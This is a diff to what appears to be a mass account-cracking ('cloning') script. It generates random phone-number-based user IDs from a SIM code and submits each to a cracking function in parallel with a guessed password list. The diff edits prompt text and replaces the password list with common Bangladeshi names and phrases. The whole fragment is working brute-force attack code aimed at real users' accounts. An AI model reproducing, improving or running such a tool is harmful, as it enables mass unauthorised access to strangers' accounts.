@@ -212,7 +212,7 @@ def RJ_SN():
     print("")
     os.system('clear')
     print(logo)
-    limit = int(input('\033[1;93m EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92m   CHOOSE CLONING LIMIT : '))
+    limit = int(input('\033[1;93m EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92mCHOOSE CLONING LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -220,14 +220,14 @@ def RJ_SN():
         os.system("clear")
         print(logo)
         tl = str(len(user))
-        print('\033[1;92m SIM CODE : \033[1;92m' +code)
+        print('\033[1;92mSIM CODE : \033[1;92m' +code)
         linex()
         print('\033[1;92mTOTAL IDS : \033[1;92m'+tl)
         linex()
-        print('\033[1;92m IF ID NOT COME TURN ON AIRPLNE')
+        print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'@#@#@#','405060','sadiya','708090','bangladesh','mababa','hridoy']
+            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','i love you','bangladesh','bangla']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
